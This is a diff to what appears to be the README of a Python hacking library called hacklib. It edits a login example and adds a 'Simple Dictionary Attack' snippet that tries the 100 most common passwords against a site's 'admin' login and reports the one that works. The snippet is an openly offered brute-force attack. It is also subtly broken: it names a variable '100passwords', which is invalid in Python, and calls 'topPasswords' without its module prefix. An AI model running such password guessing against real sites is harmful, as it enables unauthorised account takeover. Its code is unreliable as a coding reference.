@@ -37,11 +37,27 @@ ac = hacklib.AuthClient()
 # AuthClient uses the mechanize module for form-based logins
 
 # Attempts to login and return the HTML of the resulting page
-# Returns False if resulting page has the same URL as the login page
-# Returns False if login fails using HTTP Basic Authentication
 htmldata = ac.login('http://yourwebsite.com/login', 'username', 'password')
 
+
+# Returns False if login fails using HTTP Basic Authentication
+if htmldata != False:
+    print 'Login Success'
+
 # For form-based logins, returns HTML whether login works or not.
-if 'incorrect' not in htmldata:
+# Returns False if resulting page has the same URL as the login page
+if htmldata and 'incorrect' not in htmldata:
     print 'Login Success'
 ```
+Simple Dictionary Attack using AuthClient:
+```python
+import hacklib
+
+ac = hacklib.AuthClient()
+100passwords = topPasswords(100)
+
+for p in 100passwords:
+    htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
+    if 'try again' not in htmldata:
+        print 'Password is', p
+        break```
